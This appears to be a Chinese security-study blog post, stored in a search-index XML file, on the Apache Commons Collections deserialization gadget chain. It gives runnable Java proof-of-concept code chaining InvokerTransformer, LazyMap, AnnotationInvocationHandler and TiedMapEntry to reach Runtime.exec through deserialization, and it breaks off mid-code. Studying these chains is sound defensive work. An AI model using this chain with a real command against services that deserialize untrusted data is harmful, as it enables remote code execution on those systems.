<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CC3基础知识</title>
    <url>/2023/02/25/CC3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h2 id="CC3基础知识"><a href="#CC3基础知识" class="headerlink" title="CC3基础知识"></a>CC3基础知识</h2><p>简单总结一下cc3用到的基础知识。</p>
<span id="more"></span>
<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>Transformer是一个接口，其transform，是一个待实现的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>InvokerTransformer是实现了Transformer接口的具体类，其transform方法是通过反射去执行方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>测试代码，执行以下代码可弹计算机。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/25 16:19</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_InvokerTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        invokerTransformer.transform(java.lang.Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>ConstantTransformer是实现了Transformer接口的具体类，其transform方法是返回输入的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为ConstantTransformer构造函数参数可控，所以我们可以通过transform获取我们的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/25 16:29</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_ConstantTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(s);</span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> (String) constantTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">        System.out.println(s.equals(a));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>ChainedTransformer是实现了Transformer接口的具体类，其Transform方法是依次按顺序调用transform数组内的Transform变量的transform方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>测试以下代码可以成功弹计算机。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/25 16:39</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_ChainedTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="comment">//定义一个命令执行的transformers数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>LazyMap的decorate()方法接收两个参数，(Map map, Transformer factory)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>并且当map.containsKey(key)&#x3D;&#x3D;null时，其get方法会调用factory.transform(key)方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="InvocationHandler动态代理"><a href="#InvocationHandler动态代理" class="headerlink" title="InvocationHandler动态代理"></a>InvocationHandler动态代理</h3><p>实现接口的类，如果使用动态代理，执行任意方法都会执行动态代理的invoke方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Throwable;</span><br></pre></td></tr></table></figure>



<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>AnnotationInvocationHandler是一个动态代理程序，其有两个参数，<em><strong>Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2</strong></em>,一个参数是集成Annotation的类，另一个是Map对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);<span class="comment">//关键代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码，执行任意命令都可弹计算器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/25 17:06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_AnnotationInvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map outerMap= LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"><span class="comment">//        outerMap.get(&quot;1&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> c1.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler) construct.newInstance(Target.class, outerMap);<span class="comment">//参数一，只要继承Annotation的类都可以</span></span><br><span class="line">        Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.clear();<span class="comment">//执行任意命令都可弹计算器</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/25 17:06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_AnnotationInvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map outerMap= LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"><span class="comment">//        outerMap.get(&quot;1&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> c1.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler) construct.newInstance(Target.class, outerMap);<span class="comment">//参数一，只要继承Annotation的类都可以</span></span><br><span class="line">        Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line"><span class="comment">//        proxyMap.clear();//执行任意命令都可弹计算器</span></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span>  <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>注意，反序列化时，高版本AnnotationInvocationHandler的LazyMap，变成了LinkedHashMap，所以上面POC无法在高版本命令执行。</p>
<h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>其hashCode方法调用getValue方法，getValue方法里面有存在map.get方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>以下测试代码弹计算机</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/25 18:09</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_TiedMapEntry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map outerMap= LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line">        TiedMapEntry tt=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;tt&quot;</span>);</span><br><span class="line">        tt.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>反序列化测试代码，注意：回弹两遍计算机，因为hashmap的readObject的putVal会调用hash方法，里面调用了hashcode，进而调用get，触发了命令执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/25 18:09</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_TiedMapEntry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] 